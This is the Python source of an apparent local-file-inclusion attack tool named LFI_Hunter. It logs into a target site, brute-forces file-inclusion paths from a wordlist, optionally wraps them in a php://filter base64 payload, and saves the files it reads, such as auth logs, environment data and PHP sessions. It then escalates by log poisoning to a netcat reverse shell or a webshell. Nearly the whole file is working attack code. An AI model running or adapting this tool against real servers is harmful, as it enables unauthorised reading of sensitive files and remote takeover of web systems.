#!/usr/bin/env python
import urllib.response
import time
import sys
import argparse
import mechanize
import ssl
import urllib
import re
import os
import subprocess


ssl._create_default_https_context = ssl._create_unverified_context  
path = ('file://'+os.getcwd()+'/FileStore').replace('\\n','')    
class Local_File_In:

        def __init__(self,**kwargs) :          
            try: 
                with open(self .args.readuser,'r') as username:
                        self.args.user = username.read().replace('\n','')  
            except TypeError:
                    pass         
            if self.args.readpass or self.args.config:
                try:
                    with open(self.args.readpass,'r') as password:
                       self.args.password = password.read().replace('\n','')
                except TypeError:
                    pass      
            try:   
                if self.args.Cookie  or self.args.config:
                   with open(self.args.Cookie,'r') as Cookie_file :
                      self.Cookie =  Cookie_file.read()
                elif not self.args.Cookie or self.args.config:
                    with open("./Package/ConfigFile/.Cookie.txt",'r') as Cookie_file :
                        self.Cookie = Cookie_file.read()      
            except Exception as e :
                   print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                   print("[*] Error : ",e )
                   print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                   print("[*] Chech the File Name or File Path  to your Cookies File")
                   exit()                             
            print('\n'+'='*20+"\n[*] Input-INFO "+'\n'+'='*30+'\n')
            if self.args.auth:
               print("[+] Mothead             : ................ | : Full authentication")    
               try:
                  print("[+] Login url           : ................ | : "+self.args.loginurl)
                  print("[+] username            : ................ | : "+self.args.user.replace("\n",''))
                  print("[+] Login password      : ................ | : "+self.args.password)
               except Exception as e:
                    print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
                    print("[*] Error: ", e)
                    print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTIONS\n" + '=' * 14 + '\n')
                    print("[*] Verify the login information: username and password.")
                    print("[*] Use the following format: --loginurl <url> --username <username> --password <password>")
                    print("[*] Ensure the username and password are correct.")
                    print("[*] Example: --loginurl http://10.10.10.44/login.php --user admin --password admin")
                    print("[*] Refer to the README file at: https://www.github.com/jac11/LFI_Hunter.git")
                    exit()                                                
            if self.args.filelist:
                print("[+] LFI-wordlist        : ................ | : "+self.args.filelist)
            else:
                print("[+] LFI-wordlist        : ................ | : LFI-wordlist.txt")  
            print("[+] Vulnrenable url     : ................ | : "+self.args.Vulnurl)
            if self.args.base64:
               print("[+] PHP-Filter          : ................ | : Convert-base64") 
            print("[+] web Cookies         : ................ | : "+self.Cookie)   
            if self.args.auth and self.args.Vulnurl\
            and self.args.password and self.args.user\
            and self.args.loginurl :
                 Local_File_In.Login_auth(self)
                 Local_File_In.file_name(self)
                 Local_File_In.url_request(self)
            elif not self.args.auth and self.args.Vulnurl\
            and not self.args.password and not self.args.user :
                Local_File_In.url_request(self)                
            else:
                print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
                print("[*] Error: Bad argument logic command error")
                print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTIONS\n" + '=' * 14 + '\n')
                print('[+] To use LFI with login      : --auth --loginurl --vulnurl --user --password --filelist --cookie') 
                print('[+] To use LFI without login   : --vulnurl --filelist --cookie') 
                print("[*] Refer to the README file at: https://www.github.com/jac11/LFI_Hunter.git")
                exit()                              
        def Login_auth(self,**kwargs):
            try:
               loginurl = self.args.loginurl
               request = mechanize.Browser()
               request.set_handle_robots(False)
               request.set_handle_redirect(True)
               request.set_handle_refresh(True, max_time=1)
               request.addheaders = [
                                ("User-Agent", "curl/7.88.1"),
                                ("Accept", "*/*"),
                                ("Accept-Encoding", "identity"),
                                ("Connection", "close"),
                                ('Cookie',str(self.Cookie).replace('\n','')),
                                ('username',f'{self.args.user}'),
                                ('password',f'{self.args.password}')]
               url_login = request.open(loginurl) 
               try: 
                  request.select_form(nr = 0)
               except Exception :
                  try:
                    request.select_form(nr = 1)
                  except Exception:
                     try:
                       request.select_form(nr = 2)
                     except Exception:      
                        try:
                           request.select_form(nr = 3)
                        except Exception:
                            try:
                                request.select_form(nr = 4)
                            except Exception as e:
                                print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
                                print("[*] Error: ", e)
                                print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTION\n" + '=' * 14 + '\n')
                                print("[*] Try using the method without login authentication.")
                                print('[+] To use LFI without login: --vulnurl --filelist --cookie')
                                exit()                                   
                                 
               if  self.args.user and self.args.password and not self.args.PassForm and  not self.args.UserForm  :
                   request["username"] = f'{self.args.user}'
                   request["password"] = f'{self.args.password}' 
               elif self.args.user and  self.args.password and not self.args.PassForm and  self.args.UserForm:
                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
                   request["password"] = f'{self.args.password}'
               elif self.args.user and self.args.password and self.args.PassForm and not self.args.UserForm :
                   request["username"] = f'{self.args.user}'
                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
               elif self.args.user and self.args.password and  self.args.PassForm and  self.args.UserForm :
                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
               response   = request.submit()         
               self.info = response.info()
               content    = response.read()  
               self.url = response.geturl()
            except urllib.error.URLError as e:
                   print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
                   print("[*] Error : ",e )
                   print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTIONS\n" + '=' * 14 + '\n')
                   print("[*] Use the following format ")
                   print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                   print("[*] Example : http://10.10.10.193:4000/login.php")
                   exit()
            except KeyboardInterrupt :
                   exit()
          
        def url_request(self,**kwargs): 
            try: 
              domain = str(re.search(r'https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', self.args.Vulnurl)).split()
              self.ip_re = (domain[-1][7:-2])
              self.ip_re = self.ip_re[6:]
            except Exception :
               self.ip_re = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})',self.args.Vulnurl)
               self.ip_re = self.ip_re.group() 
            try:           
               if not os.path.exists('./FileStore/'+self.ip_re+"/"):
                  os.makedirs('./FileStore/'+self.ip_re+"/")
            except AttributeError as e:
                   print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
                   print("[*] Error : ",e )
                   print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
                   print("[*] Use the following format ")
                   print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                   print("[*] Example : http://10.10.10.193:4000/login.php")
                   exit()                
            ssl._create_default_https_context = ssl._create_unverified_context 
            if not self.args.filelist:
                   self.args.filelist= './Package/LFI-wordlist.txt'
            else:
                 pass  
            try:                         
               with open(self.args.filelist,'r') as readline :
                    pass
            except FileNotFoundError as e:
                   print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
                   print("[*] Error : ",e )
                   print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
                   print("[*] Check the file path to your custom LFI wordlist using -F/--filelist.")
                   print("[*] Alternatively, try using the default path without specifying -F/--filelist.")
                   exit()
            with open(self.args.filelist,'r') as readline :        
                command_dir = readline.readlines()
                for LINE in command_dir :
                    LINE.replace('\n','')
                    self.LFi = ''
                    if self.args.base64:
                        if 'sess_' not in LINE :
                            phpfillter = 'php://filter/read=convert.base64-encode/resource='
                            URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE
                        else:
                            URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE.replace('\n','')+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))
                    elif 'sess_' in LINE:
                        URL = self.args.Vulnurl+LINE+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))    
                    else:
                         URL = self.args.Vulnurl+LINE
                                                                                                          
                    self.url =  URL
                    request = mechanize.Browser()
                    request.set_handle_robots(False)
                    request.set_handle_redirect(True)
                    request.set_handle_refresh(True, max_time=1)              
                    request.addheaders = [
                                ("User-Agent", "curl/7.88.1"),
                                ("Accept", "*/*"),
                                ("Accept-Encoding", "identity"),
                                ("Connection", "close"),
                                ('Cookie',str(self.Cookie).replace('\n','')),
                                ('username',f'{self.args.user}'),
                                ('password',f'{self.args.password}')]
                                
                    try:             
                        self._first_req = request.open(self.args.Vulnurl).read()                                                      
                        self.Get_Oregnal_URL = request.open(self.url).read()
                    except Exception  as e :
                        if '404' or '500' in str(e):
                            self.Get_Oregnal_URL = self.url
                        else:    
                            continue    
                   # except Exception  as e :
                    #       print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
                     #      print("[*] Error : ",e )
                      #     print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
                      ##    print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                        #   print("[*] Example : http://10.10.10.193:4000/login.php?login=")
                         #  exit()       
                    except KeyboardInterrupt:
                       exit()        
                    print('='*20+"\n[*] Brute force Method "+'\n'+'='*30+'\n')
                    print("[+] Testing payload     : ................ | : "+self.url[-50:].replace('\\n',''))

                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K') 
                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K')
                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K')                             
                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K') 
                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K')
                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K')

                    if self.args.auth and len(self.Get_Oregnal_URL) > len(self._first_req) or self.args.auth and len(self.Get_Oregnal_URL) > 200 :                  
                      pythex = str(re.findall('Content-Length:.+',str(self.info)))
                      pythex= pythex.replace("['",'').replace("']",'')
                      if pythex in str(self.info):
                        info = str(self.info).replace(pythex,'Content-Length:'+str(len(self.Get_Oregnal_URL)))
                        rex2 = re.findall(':.+',info)
                        print('='*20+"\n[*] Web-Info "+'\n'+'='*30+'\n')
                        print("[+] Date                : ................ | "+rex2[0])
                        print("[+] Server              : ................ | "+rex2[1])
                        print("[+] Expires             : ................ | "+rex2[2])
                        print("[+] Cache-Control       : ................ | "+rex2[3])
                        print("[+] Pragma              : ................ | "+rex2[4])
                        print("[+] Vary                : ................ | "+rex2[5])
                        print("[+] Content-Length      : ................ | "+str(rex2[6]).replace(':',': '))
                        print("[+] Connection          : ................ | "+rex2[7])
                        print("[+] Content-Type        : ................ | "+rex2[8]+'\n')
                        print('='*20+"\n[*] Vulnerable Found  "+'\n'+'='*30+'\n')
                        print("[+] Vulnerable  Link : ................ | : "+self.url)                        
                        Local_File_In.file_name(self)
                        from Package.FileStore import FileManager
                        FileManager.FileRStore_Write(self,args=self.control)
                        print('='*20+"\n[*] Path Traversal "+'\n'+'='*30+'\n')
                        print("[+] File request        : ................ | : "+self.args.read.replace('\n','').replace("-","/")) 
                        print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))
                        print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''))
                        print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"+self.args.read.replace('/','',1).replace('/','_').replace('\n','').strip())
                        if self.args.shell:
                                if  "auth" in  self.url or "auth.log" in  self.url\
                                or "environ" in self.url or "/apache2/php.ini" in self.url \
                                or  "fpm/php.ini" in self.url or 'sessions' in self.url : 
                                    print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                    time.sleep(1)
                                    print("[+] Attack type          : ................ | : Reverse-Shell") 
                                    if self.args.port: 
                                        with open("./Package/shell/.port",'w') as port:
                                            port.write(self.args.port)
                                
                                    print("[+] Mothead              : ................ | : injecting log file  ")
                                    print("[+] Lisliner Tool        : ................ | : NETCAT ")
                                    print("[+] Lisliner IP          : ................ | :",self.args.shell)   
                                    if not self.args.port:
                                        if os.path.exists("./Package/shell/.port"):
                                            os.remove("./Package/shell/.port")
                                        print("[+] Lisliner Port        : ................ | : 7777") 
                                    else:
                                       print("[+] Lisliner Port        : ................ | : " + self.args.port)   
                                    from Package.LFT_Shell_connect import Shell_conncet
                                    Shell_conncet.Connect_SSh_Shell(self,args = self.control)
                                    exit()
                                else:
                                    print('\n' + '=' * 20 + "\n[*] SHELL INFORMATION\n" + '=' * 30 + '\n')
                                    time.sleep(1)
                                    print("[*] FILE: ", self.args.read)
                                    time.sleep(1)
                                    print("[*] INFO: Unable to add PHP code to", self.args.read)
                                    time.sleep(1)
                                    print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTION\n" + '=' * 14 + '\n')
                                    print("[*] To obtain a shell, try using --read with the 'environ' or 'auth' log file.")
                                    print("[*] Example : --read /var/log/auth.log ")
                                    print("[*] Example : --read /proc/self/environ")
                                    print("[*] Example : --read /var/log/auth")
                                    exit()  
                        elif self.args.webshell or self.args.config:
                            from Package.webshell import WebShellInteract    
                            if 'auth' in self.url or 'auth.log' in self.url:
                                WebShellInteract.__init__(self) 
                                WebShellInteract.Soures_Web(self,**kwargs) 
                            else:   
                                WebShellInteract.__init__(self)  
                                WebShellInteract.WebShell(self,**kwargs)  
                            exit()             
                        else:
                            exit()            
                    elif not self.args.auth and len(self.Get_Oregnal_URL) > len(self._first_req) or len(self.Get_Oregnal_URL) > 200:
                        Local_File_In.file_name(self)
                        from Package.FileStore import FileManager
                        FileManager.FileRStore_Write(self,args=self.control)
                        print('='*20+"\n[*] Vulnerable Found  "+'\n'+'='*30+'\n')
                        print("[+] Vulnerable Link     : ................ | : "+self.url)
                        print('='*20+"\n[*] Path Traversal "+'\n'+'='*30+'\n')
                        print("[+] File request        : ................ | : "+self.args.read.replace('\n','').replace("-","/")) 
                        print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))          
                        print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''))
                        print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"\
                          +self.args.read.replace('/','',1).replace('/','_').replace('\n',''))   
                        if self.args.shell:
                                if  "auth" in  self.url or "auth.log" in  self.url\
                                or "environ" in self.url or "/apache2/php.ini" in self.url \
                                or  "fpm/php.ini" in self.url or 'sessions' in self.url : 
                                    print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                    time.sleep(1)
                                    print("[+] Attack type          : ................ | : Reverse-Shell") 
                                    if self.args.port: 
                                        with open("./Package/shell/.port",'w') as port:
                                            port.write(self.args.port)
                                    print("[+] Mothead              : ................ | : injecting log file  ")
                                    print("[+] Lisliner Tool        : ................ | : NETCAT ")
                                    print("[+] Lisliner IP          : ................ | :",self.args.shell)   
                                    if not self.args.port:
                                        if os.path.exists("./Package/shell/.port"):
                                            os.remove("./Package/shell/.port")
                                        print("[+] Lisliner Port        : ................ | : 7777") 
                                    else:
                                       print("[+] Lisliner Port        : ................ | : " + self.args.port)   
                                    from Package.LFT_Shell_connect import Shell_conncet
                                    Shell_conncet.Connect_SSh_Shell(self,args = self.control)
                                    exit()
                                else:
                                    print('\n' + '=' * 20 + "\n[*] SHELL INFORMATION\n" + '=' * 30 + '\n')
                                    time.sleep(1)
                                    print("[*] FILE: ", self.args.read)
                                    time.sleep(1)
                                    print("[*] INFO: Unable to add PHP code to", self.args.read)
                                    time.sleep(1)
                                    print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTION\n" + '=' * 14 + '\n')
                                    print("[*] To obtain a shell, try using --read with the 'environ' or 'auth' log file.")
                                    print("[*] Example : --read /var/log/auth.log ")
                                    print("[*] Example : --read /proc/self/environ")
                                    print("[*] Example : --read /var/log/auth")
                                    exit()  
                        elif self.args.webshell or self.args.config:
                            from Package.webshell import WebShellInteract    
                            if 'auth' in self.url or 'auth.log' in self.url:
                                WebShellInteract.__init__(self) 
                                WebShellInteract.Soures_Web(self,**kwargs) 
                            else:   
                                WebShellInteract.__init__(self)  
                                WebShellInteract.WebShell(self,**kwargs)  
                            exit()             
                        else:
                            exit()                           
                print('\n'+'='*20+"\n[*] RESUITE-INFO "+'\n'+'='*30+'\n')
                print("[*] No Data found")
                print("[*] No Permission To read the File")
                print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                print("[*] try to use new cookie ")
                print("[*] try to use aggressive mode ")                
                if not self.args.base64:
                   print("[*] try to use PHP Filter by useing -B/--base64 ")  
                print("[*] Refer to the README file at: https://www.github.com/jac11/LFI_Hunter.git")   
                exit()                          
        def file_name (self,**kwargs):
            self.args.read = "-".join(str("".join(re.findall('=.+',self.url))).split("/")[-2:])
            try:
                with open (".RQData",'w')as RQ :
                    RQ.write(str(self._first_req))
            except AttributeError:
                pass        

if __name__=='__main__':
     Local_File_In()